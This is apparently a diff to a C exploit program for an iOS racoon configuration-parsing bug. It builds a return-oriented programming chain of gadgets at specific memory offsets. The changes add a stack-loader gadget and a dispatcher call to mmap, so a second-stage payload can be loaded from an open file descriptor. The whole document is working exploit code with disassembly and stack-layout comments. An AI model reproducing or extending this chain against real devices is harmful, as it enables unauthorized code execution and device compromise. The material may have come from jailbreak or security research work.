@@ -5,6 +5,7 @@
 #include <stdlib.h>
 #include <string.h>
 #include <unistd.h>
+#include <sys/mman.h>
 
 enum ropgadget_types {
 	STATIC,
@@ -29,12 +30,17 @@ struct offset_struct {
 	uint64_t pivot_x21;
 	uint64_t memmove;
 	uint64_t lcconf_counter_offset;
-	uint64_t open;
 	uint64_t dispatcher;
 	uint64_t regloader;
+	uint64_t stackloader;
 	uint64_t longjmp;
+	uint64_t open;
+	uint64_t mmap;
+	uint64_t stage2_base;
+	uint64_t stage2_size;
 };
 typedef struct offset_struct offset_struct_t;
+#define STAGE2_FD 3
 
 void stage1(int fd, offset_struct_t * offsets);
 void get_ip_from_value(char * ip, uint32_t value);
@@ -233,7 +239,9 @@ void stage1(int fd, offset_struct_t * offsets) {
 		curr_gadget->next = NULL; \
 		curr_gadget->type = NONE; \
 		prev->next = curr_gadget; \
-	}
+	}else{ \
+		prev = curr_gadget; \
+	} 
 
 #define ADD_CODE_GADGET(addr) \
 	ADD_GADGET(); \
@@ -332,41 +340,75 @@ int main() {
 		and after that it will load x30 from the stack at 0x38 and add 0x40 to the stack, so the stack will move from 0xb0 to 0xf0
 		We will call open("/private/etc/racoon/<func pointer>", O_RDONLY); the func pointer will be used to know which slide we need to use
 		Path is stored at 0x70 FIXME (we need to be right before a func pointer)
+
+	[5]:
+		we need to load new regs now, we will use a stack loader for that
+		(again not from my cache)
+        0x18098e2a8      fd7b46a9       ldp x29, x30, [sp, 0x60]
+        0x18098e2ac      f44f45a9       ldp x20, x19, [sp, 0x50]
+        0x18098e2b0      f65744a9       ldp x22, x21, [sp, 0x40]
+        0x18098e2b4      f85f43a9       ldp x24, x23, [sp, 0x30]
+        0x18098e2b8      fa6742a9       ldp x26, x25, [sp, 0x20]
+        0x18098e2bc      fc6f41a9       ldp x28, x27, [sp, 0x10]
+        0x18098e2c0      ffc30191       add sp, sp, 0x70
+        0x18098e2c4      c0035fd6       ret
+
+		So now we load all the regs and afterwards the stack will be moved from 0xf0 to 0x160
+	
+	[6]:
+		 regloader again
+	[7]:
+		dispatcher to mmap(stage2_base,stage2_size,PROT_READ | PROT_WRITE,STAGE2_FD,0)
 	*/
 	ROP_SETUP(&myoffsets);
-	ADD_OFFSET_GADGET(0);				   // 0x00 [1] x9 will be loaded from here and then again point to our stack so at our stack+0x50 we need the next gadget
-	ADD_GADGET();						   // 0x08 [2] x20
-	ADD_CODE_GADGET(myoffsets.open);	   // 0x10 [2] x21 [4] dispatcher: jump/next gadget
-	ADD_STATIC_GADGET(O_RDONLY);		   // 0x18 [2] x22 [3] regloader: x1/second arg
-	ADD_OFFSET_GADGET(0x70)				   // 0x20 [2] x23 [3] regloader: x0/first arg (path for open)
-	ADD_GADGET();						   // 0x28 [2] x24 [3] regloader: x2/thrid arg
-	ADD_GADGET();						   // 0x30 [2] x25
-	ADD_GADGET();						   // 0x38 [2] x26 [3] regloader: x4/fourth arg
-	ADD_GADGET();						   // 0x40 [2] x27 [3] regloader: x5/fifth arg
-	ADD_CODE_GADGET(myoffsets.dispatcher); // 0x48 [2] x28 [3] regloader: jump/next gadget
-	ADD_CODE_GADGET(myoffsets.longjmp);	   // 0x50 [1] (next gadget) [2] 0x29 (but x29 will be overwritten later)
-	ADD_CODE_GADGET(myoffsets.regloader);  // 0x58 [2] x30 (next gadget)
-	ADD_GADGET();						   // 0x60 [2] x29
-	ADD_OFFSET_GADGET(0xb0);			   // 0x68 [2] x2  (new stack)
-	ADD_GADGET();						   // 0x70 [2] weird Dx registers
-	ADD_GADGET();						   // 0x78 [2] weird Dx registers
-	ADD_GADGET();						   // 0x80 [2] weird Dx registers
-	ADD_GADGET();						   // 0x88 [2] weird Dx registers
-	ADD_GADGET();						   // 0x90 [2] weird Dx registers
-	ADD_GADGET();						   // 0x98 [2] weird Dx registers
-	ADD_GADGET();						   // 0xa0 [2] weird Dx registers
-	ADD_GADGET();						   // 0xa8 [2] weird Dx registers
+	ADD_OFFSET_GADGET(0);					   // 0x00		[1] x9 will be loaded from here and then again point to our stack so at our stack+0x50 we need the next gadget
+	ADD_GADGET();							   // 0x08		[2] x20
+	ADD_CODE_GADGET(myoffsets.open);		   // 0x10		[2] x21 [4] dispatcher: jump/next gadget
+	ADD_STATIC_GADGET(O_RDONLY);			   // 0x18		[2] x22 [3] regloader: x1/second arg
+	ADD_OFFSET_GADGET(0x70)					   // 0x20		[2] x23 [3] regloader: x0/first arg (path for open)
+	ADD_GADGET();							   // 0x28		[2] x24 [3] regloader: x2/thrid arg
+	ADD_GADGET();							   // 0x30		[2] x25 [3] regloader: x3/fourth arg
+	ADD_GADGET();							   // 0x38		[2] x26 [3] regloader: x4/fifth arg
+	ADD_GADGET();							   // 0x40		[2] x27 [3] regloader: x5/sixth arg
+	ADD_CODE_GADGET(myoffsets.dispatcher);	   // 0x48		[2] x28 [3] regloader: jump/next gadget
+	ADD_CODE_GADGET(myoffsets.longjmp);		   // 0x50		[1] (next gadget) [2] 0x29 (but x29 will be overwritten later)
+	ADD_CODE_GADGET(myoffsets.regloader);	   // 0x58		[2] x30 (next gadget)
+	ADD_GADGET();							   // 0x60		[2] x29
+	ADD_OFFSET_GADGET(0xb0);				   // 0x68		[2] x2  (new stack)
+	ADD_GADGET();							   // 0x70		[2] weird Dx registers
+	ADD_GADGET();							   // 0x78		[2] weird Dx registers
+	ADD_GADGET();							   // 0x80		[2] weird Dx registers
+	ADD_GADGET();							   // 0x88		[2] weird Dx registers
+	ADD_GADGET();							   // 0x90		[2] weird Dx registers
+	ADD_GADGET();							   // 0x98		[2] weird Dx registers
+	ADD_GADGET();							   // 0xa0		[2] weird Dx registers
+	ADD_GADGET();							   // 0xa8		[2] weird Dx registers
 
-	ADD_GADGET();					       // 0xb0 [2] new stack top 
-	ADD_GADGET();						   // 0xb8 
-	ADD_GADGET();						   // 0xc0 [4] x22
-	ADD_GADGET();						   // 0xc8 [4] x21
-	ADD_GADGET();						   // 0xd0 [4] x20
-	ADD_GADGET();						   // 0xd8 [4] x19
-	ADD_GADGET();						   // 0xe0 [4] x29 
-	ADD_GADGET();						   // 0xe8 [4] x30/ld load (next gadget)
-	ADD_GADGET();						   // 0xf0 [4] stack will be here after dispatch returned
-	ADD_GADGET();						   // 0xf8 
+	ADD_GADGET();							   // 0xb0		[2] new stack top 
+	ADD_GADGET();							   // 0xb8		
+	ADD_GADGET();							   // 0xc0		[4] x22
+	ADD_GADGET();							   // 0xc8		[4] x21
+	ADD_GADGET();							   // 0xd0		[4] x20
+	ADD_GADGET();							   // 0xd8		[4] x19
+	ADD_GADGET();							   // 0xe0		[4] x29 
+	ADD_CODE_GADGET(myoffsets.stackloader);	   // 0xe8		[4] x30/ld load (next gadget)
+
+	ADD_GADGET();							   // 0xf0		[4] stack will be here after dispatch returned
+	ADD_GADGET();							   // 0xf8 
+	ADD_CODE_GADGET(myoffsets.dispatcher);	   // 0x100		[5] x28 [6] regloader: jump/next gadget
+	ADD_GADGET();							   // 0x108		[5] x27 [6] regloader: x5/fifth arg
+	ADD_STATIC_GADGET(0);					   // 0x110		[5] x26 [6] regloader: x4/fourth arg
+	ADD_STATIC_GADGET(STAGE2_FD);			   // 0x118		[5] x25 [6] regloader: x3/fourth arg
+	ADD_STATIC_GADGET(PROT_READ | PROT_WRITE); // 0x120		[5] x24 [6] regloader: x2/third arg
+	ADD_STATIC_GADGET(myoffsets.stage2_size);  // 0x128		[5] x23 [6] regloader: x1/second arg
+	ADD_STATIC_GADGET(myoffsets.stage2_base);  // 0x130		[5] x22 [6] regloader: x0/frist arg
+	ADD_CODE_GADGET(myoffsets.mmap);		   // 0x138		[5] x21 [7] dispatcher: jump/next gadget
+	ADD_GADGET();							   // 0x140		[5] x20
+	ADD_GADGET();							   // 0x148		[5] x19
+	ADD_GADGET();							   // 0x150		[5] x29 
+	ADD_CODE_GADGET(myoffsets.regloader);	   // 0x158		[5] x30 (next gadget) 
+
+	ADD_GADGET();							   // 0x160     [5] new stack top
 
 
 
